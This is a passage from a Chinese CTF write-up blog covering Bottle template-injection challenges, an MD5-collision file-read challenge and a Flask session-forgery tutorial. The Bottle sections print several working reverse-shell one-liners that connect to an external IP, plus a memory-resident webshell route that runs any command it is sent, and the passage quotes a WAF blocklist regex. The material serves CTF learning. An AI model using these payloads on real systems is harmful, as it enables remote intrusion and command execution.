class="hljs-keyword">data</span>=shell)<br>    response = requests.post(url+<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&quot;123&quot;</span>:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;)<br>    print(response.<span class="hljs-keyword">text</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    url=<span class="hljs-string">&quot;http://node6.anna.nssctf.cn:20921/&quot;</span><br>    <span class="hljs-built_in">exp</span>(url)<br></code></pre></td></tr></table></figure><h1 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h1><p>这道题目其实是题目制作者之前在打VN时想到的一个非预期，于是把这个思路出成题来给师傅们做一下。</p><p>其实当时我也感觉到这个非预期，但是没尝试成功</p><p>这里代码审计，</p><p>首先我们可以看到其是一个模板的渲染，直接将我们输入的message进行拼接，但其waf过滤了<code>&#123;</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">ef <span class="hljs-built_in">waf</span>(message):<br>    return message.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br>@app.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def <span class="hljs-built_in">index</span>():<br>    return <span class="hljs-built_in">template</span>(<span class="hljs-built_in">handle_message</span>(messages))<br><br><br>@app.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/Clean&#x27;</span>)<br>def <span class="hljs-built_in">Clean</span>():<br>    global messages<br>    messages = []<br>    return <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span><br><br>@app.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/submit&#x27;</span>, method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>def <span class="hljs-built_in">submit</span>():<br>    message = <span class="hljs-built_in">waf</span>(request.forms.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;message&#x27;</span>))<br>    messages.<span class="hljs-built_in">append</span>(message)<br>    return <span class="hljs-built_in">template</span>(<span class="hljs-built_in">handle_message</span>(messages))<br></code></pre></td></tr></table></figure><p>我们看bottle框架的官方文档可以发现</p><p>在SimpleTemplate模板下我们可以使用<code>%</code>来执行python代码。</p><p>这样就可以绕过<code>&#123;</code>了，但是我们的<code>%</code>所在的那一行<code>%</code>的前面只能有空白字符，我们直接换行即可</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302149856.png" alt="image-20250330214931385"></p><p>可以反弹shell</p><p>这里注意我们需要使命令单独一行，不要让其前后的html所影响，这里有三种方法</p><p>一种是前后都带上换行</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><br><br><br>% __import__<span class="hljs-punctuation">(</span>&#x27;os&#x27;<span class="hljs-punctuation">)</span>.system<span class="hljs-punctuation">(</span>&#x27;nc 101.37.80.83 <span class="hljs-number">8080</span> -e /bin/bash&#x27;<span class="hljs-punctuation">)</span><br><br><br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302232336.png" alt="image-20250330223201876"></p><p>一种是后面带上<code>#</code>来注释</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">% __import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;101.37.80.83\&quot;,8080));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;&quot;</span>).<span class="hljs-built_in">read</span>()<span class="hljs-comment">#</span><br>或者<br>% import <span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;101.37.80.83&quot;</span>,<span class="hljs-number">8080</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<span class="hljs-comment">#</span><br>或者<br>% __import__(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.37.80.83/8080 0&gt;&amp;1&#x27;&quot;</span>)<span class="hljs-comment">#</span><br>或者<br>% __import__(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;nc 101.37.80.83 8080 -e /bin/bash&#x27;</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>一种是闭合<code>&lt;div&gt;</code>标签从而执行命令</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta">&lt;/<span class="hljs-keyword">div</span>&gt;&lt;small <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;message-time&quot;</span>&gt;<span class="hljs-number">123</span>&lt;/small&gt;&lt;/<span class="hljs-keyword">div</span>&gt;<br>% __import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.37.80.83/8080 0&gt;&amp;1&#x27;&quot;</span>)<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;message-card&quot;</span>&gt;=&lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;message-content&quot;</span>&gt;&lt;/<span class="hljs-keyword">div</span>&gt;<br><br></code></pre></td></tr></table></figure><p>亲测这三种都可以反弹shell</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302222262.png" alt="image-20250330222212107"></p><p>我们还可以用内存马</p><p>参考此文：<a href="https://forum.butian.net/share/4048">https://forum.butian.net/share/4048</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><br><br>% <span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request<br>% app=__import__(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>]<br>% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(request.params.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>)).<span class="hljs-keyword">read</span>())<br><br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302235408.png" alt="image-20250330223542853"></p><h1 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h1><p>上面那道题目是白盒，这个是黑盒</p><p>从官方WP中看到waf和语法检测的逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-comment"># 保留原有基础过滤</span><br>    filtered = message.replace(<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># 预处理混淆特征</span><br>    cleaned = re.sub(<span class="hljs-string">r&#x27;[\&#x27;&quot;`\\]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, filtered)  <span class="hljs-comment"># 清除引号和反斜杠</span><br>    cleaned = re.sub(<span class="hljs-string">r&#x27;/\*.*?\*/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, cleaned)  <span class="hljs-comment"># 去除注释干扰</span><br><br>    <span class="hljs-comment"># 增强型sleep检测正则（覆盖50+种变形）</span><br>    sleep_pattern = <span class="hljs-string">r&#x27;&#x27;&#x27;(?xi)</span><br><span class="hljs-string">(</span><br><span class="hljs-string">    # 基础关键词变形检测</span><br><span class="hljs-string">    \b</span><br><span class="hljs-string">    s[\s\-_]*l[\s\-_]*e[\s\-_]*e[\s\-_]*p+  # 允许分隔符：s-l-e-e-p</span><br><span class="hljs-string">    | s(?:l3|1|i)(?:3|e)(?:3|e)p            # 字符替换：sl33p/s1eep</span><br><span class="hljs-string">    | (?:sl+e+p|slee+p|sle&#123;2,&#125;p)            # 重复字符：sleeeeep</span><br><span class="hljs-string">    | (?:s+|5+)(?:l+|1+)(?:e+|3+)&#123;2&#125;(?:p+|9+)  # 全替换变体：5l33p9</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # 模块调用检测（含动态导入）</span><br><span class="hljs-string">    | (?:time|os|subprocess|ctypes|signal)\s*\.\s*(?:sleep|system|wait)\s*\(.*?\)</span><br><span class="hljs-string">    | __import__\s*\(\s*[\&#x27;&quot;](?:time|os)[\&#x27;&quot;]\s*\)\.\s*\w+\s*\(.*?\)</span><br><span class="hljs-string">    | getattr\s*\(\s*\w+\s*,\s*[\&#x27;&quot;]sleep[\&#x27;&quot;]\s*\)\s*\(.*?\)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # 编码检测（Hex/Base64/URL/Unicode）</span><br><span class="hljs-string">    | (?:\\x73|%73|%u0073)(?:\\x6c|%6c|%u006c)(?:\\x65|%65|%u0065)&#123;2&#125;(?:\\x70|%70|%u0070)  # HEX/URL编码</span><br><span class="hljs-string">    | YWZ0ZXI=.*?(?:c2xlZXA=|czNlM3A=)  # Base64多层编码匹配（sleep的常见编码）</span><br><span class="hljs-string">    | %s(l|1)(e|3)&#123;2&#125;p%                # 混合编码</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # 动态执行检测（修复括号闭合）</span><br><span class="hljs-string">    | (?:eval|exec|compile)\s*\(.*?(?:sl(?:ee|3&#123;2&#125;)p|[&#x27;&quot;]\\x73\\x6c\\x65\\x65\\x70).*?\) </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # 系统调用检测（Linux/Windows）</span><br><span class="hljs-string">    | /bin/(?:sleep|sh)\b</span><br><span class="hljs-string">    | (?:cmd\.exe\s+/c|powershell)\s+.*?(?:Start-Sleep|timeout)\b</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # 混淆写法</span><br><span class="hljs-string">    | s\/leep\b     # 路径混淆</span><br><span class="hljs-string">    | s\.\*leep      # 通配符干扰</span><br><span class="hljs-string">    | s&lt;!--leep      # 注释干扰</span><br><span class="hljs-string">    | s\0leep        # 空字节干扰</span><br><span class="hljs-string">    | base64</span><br><span class="hljs-string">    | base32</span><br><span class="hljs-string">    | decode</span><br><span class="hljs-string">    | \+</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><br>    <span class="hljs-keyword">if</span> re.search(sleep_pattern, cleaned):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;检测到非法时间操作！&quot;</span><br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">&#x27;eval&#x27;</span>, cleaned):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;eval会让我报错&quot;</span><br><br>    <span class="hljs-comment"># AST语法树检测增强</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepDetector</span>(ast.NodeVisitor):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Call</span>(<span class="hljs-params">self, node</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(node.func, <span class="hljs-string">&#x27;id&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;sleep&#x27;</span> <span class="hljs-keyword">in</span> node.func.<span class="hljs-built_in">id</span>.lower():<br>                <span class="hljs-keyword">raise</span> ValueError<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.func, ast.Attribute):<br>                <span class="hljs-keyword">if</span> node.func.attr == <span class="hljs-string">&#x27;sleep&#x27;</span> <span class="hljs-keyword">and</span> \<br>                        <span class="hljs-built_in">isinstance</span>(node.func.value, ast.Name) <span class="hljs-keyword">and</span> \<br>                        node.func.value.<span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>):<br>                    <span class="hljs-keyword">raise</span> ValueError<br><br>            <span class="hljs-variable language_">self</span>.generic_visit(node)<br><br>    <span class="hljs-keyword">try</span>:<br>        tree = ast.parse(filtered)<br>        SleepDetector().visit(tree)<br>    <span class="hljs-keyword">except</span> (SyntaxError, ValueError):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;检测某种语法错误，防留言板报错系统启动&quot;</span><br><br>    <span class="hljs-keyword">return</span> filtered<br></code></pre></td></tr></table></figure><blockquote><p>虽然前面的黑名单横很长但是因为我是让ai给我写的黑名单，我测了一下发现，啥也防不住。如果不是后面简单自己加了点关键字师傅们靠拼接都能绕过去。这个waf也主要是为了防止师傅们盲注，但是如果愿意绕还是能绕的。</p><p>白名单之后其实就加了一些AST的语法检测。在我们语法报错的时候会变量替换</p></blockquote><p>当我们还按照上题的思路来打的时候</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">% <span class="hljs-built_in">print</span>(1)<br></code></pre></td></tr></table></figure><p>其就会触发语法错误。因为在python里%print这本身就是一个错误的语法，为了让他可以通过语法检测然而语法检测这种东西肯定针对的是代码，那么我们将他变成字符串就可以了。</p><p>所以用引号包裹就可以绕过ast的检测</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#x27;&#x27;&#x27;<br>% from bottle import Bottle, request<br>% app=<span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;sys&#x27;</span>).modules[<span class="hljs-emphasis">&#x27;__main__&#x27;</span>].<span class="hljs-emphasis">__dict__</span>[<span class="hljs-emphasis">&#x27;app&#x27;</span>]<br>% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :<span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).popen(request.params.get(<span class="hljs-emphasis">&#x27;cmd&#x27;</span>)).read())<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302306113.png" alt="image-20250330230612572"></p><h1 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h1><p>绕过md5</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;b=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br></code></pre></td></tr></table></figure><p>接下来有两种解法，一个是直接进行目录遍历，一个是直接使用CVE-2024-2961漏洞实现命令执行。</p><blockquote><p>第一种解法，有出过题的，大部分都是采用<a href="https://github.com/CTF-Archives/ctf-docker-template%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84%E6%A8%A1%E7%89%88%E3%80%82%E4%B8%80%E8%88%AC%E5%87%BA%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B8%BA%E4%BA%86%E6%96%B9%E4%BE%BF%EF%BC%8C%E4%B8%8D%E5%8E%BB%E4%BF%AE%E6%94%B9dockerfile%E6%96%87%E4%BB%B6%EF%BC%8C%E9%83%BD%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%AE%B9%E5%99%A8%E5%86%85%E4%BF%AE%E6%94%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8Dcommit%E7%94%9F%E6%88%90%E9%95%9C%E5%83%8F%E3%80%82">https://github.com/CTF-Archives/ctf-docker-template这里面的模版。一般出题过程中，为了方便，不去修改dockerfile文件，都会直接在容器内修改，然后再commit生成镜像。</a></p><p>里面的php出题模版中，有一个容器启动命令文件docker-entrypoint.sh。可以看到该命令文件在容器初始化后就会被删掉。但是在提交生成镜像后，由镜像生成容器又需要运行该文件。因此有的出题者为了方便可能就不删除该文件，这时候就可以碰碰运气，看看出题者有没有把这个文件删掉。没有删掉，就能够获取路径。</p></blockquote><p>因此，在这里直接尝试读取docker-entrypoint.sh文件，可以发现该文件将flag变量输入到了<code>/f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302315611.png" alt="image-20250330231520032"></p><p>然后继续利用敏感文件读取来读flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503302316405.png" alt="image-20250330231616813"></p><p>敏感文件读取为非预期解法，CVE-2024-2961为预期解法。</p><p>PHP利用iconv()中的一个缓冲区溢出漏洞CVE-2024-2961，实现将文件读取提升为任意命令执行漏洞</p><p>这里包含了许多pwn知识，以后复现</p><h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a href="https://hyggevv.github.io/2025/03/07/GHCTF2025/#Message-in-a-Bottle">https://hyggevv.github.io/2025/03/07/GHCTF2025/#Message-in-a-Bottle</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask安全问题</title>
    <link href="/2025/07/13/Flask%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/13/Flask%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="jinja2模板注入"><a href="#jinja2模板注入" class="headerlink" title="jinja2模板注入"></a>jinja2模板注入</h1><p>详见SSTI学习总结</p><h1 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。</p><p>用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息。</p><p>其实作者在《HTTP原理及具体细节》一文中讲了session，这里就不具体展开了</p><h2 id="flask-session"><a href="#flask-session" class="headerlink" title="flask session"></a>flask session</h2><p><strong>储存方式</strong></p><p>第一种方式：直接存在客户端的cookies中</p><p>第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</p><p>flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</p><p><strong>flask session格式</strong></p><p>flask的session格式一般是由<code>base64加密的Session数据(经过了json、zlib压缩处理的字符串) </code> .  <code>时间戳</code>  .  <code>签名</code>组成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0<br>               session数据                     . 时间戳.         签名               <br></code></pre></td></tr></table></figure><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p><p><strong>secret_key怎么获得？</strong></p><p>secret_key有可能可以直接在源代码里找到（如果给了的话），比如在config.py里面发现密钥；</p><p>也有可能在环境变量里找到，比如<code>/proc/self/environ</code>或者<code>/proc/1/environ</code>；</p><p>也有可能在内存中获取，参考：<a href="https://blog.csdn.net/qqww22884455/article/details/148213487">Flask Session 伪造全流程解析：从内存窃取到会话劫持_flask session伪造-CSDN博客</a>；</p><p>若<code>SECRET_KEY</code>较弱（如短字符串或常见密码），工具可尝试暴力破解（该工具下面会介绍）；</p><p>命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python flask_session_cookie_manager3.py crack -c &lt;SESSION_COOKIE&gt; -w &lt;WORDLIST_PATH&gt;<br></code></pre></td></tr></table></figure><p>当然，也有可能结合其他漏洞获得secret_key，或者给定了一个可破解的密钥生成算法（根据源代码）。</p><p><strong>获得secret_key怎么伪造呢？</strong></p><p>session伪造其实主要是利用工具或者脚本。</p><p>工具：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a></p><p>工具的使用方法可以自己查阅，使用该工具就完全可以做到session伪造</p><p>脚本（原作者是phith0n）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure><p>该脚本用于解密，使用方法</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">命令：<br>python Decrypt_session_phith0n.py .eJxNUE2LgzAQ_SvLnD2otZdCDy5RcSHJWiIyuYjtWjWaLtiWxpT<span class="hljs-punctuation">-</span><span class="hljs-number">9027</span>sOxhmMP7mjd3qI9ze<span class="hljs-punctuation">-</span><span class="hljs-number">5</span>hc5mvrQf18AWbO7ztYQOopaKkW1OBAa<span class="hljs-punctuation">-</span>ShYZ4wyr3ORkXFhY3Sd57XqUTF6VBu<span class="hljs-punctuation">-</span>upSiJmy5WsPpwysUwnIdU7hSIOmS0sFV2A2vE0NfzJIU5L0gHVuOIVXaNNFkYOPgvzwGndLkIU7oaqjFiWTmi7lczKQGZoOMkXqWLrvCM3W3h4cDjPx_ryPbanfxUSw7Lcp6RXaHsXXVipDhG1nXHxiup0dDUnJnJDn9FZvvB4<span class="hljs-punctuation">-</span><span class="hljs-number">7</span>IbdNO1f06CTJ<span class="hljs-punctuation">-</span>y<span class="hljs-punctuation">-</span>EVOjXYA6OYyDwY8uJ7b<span 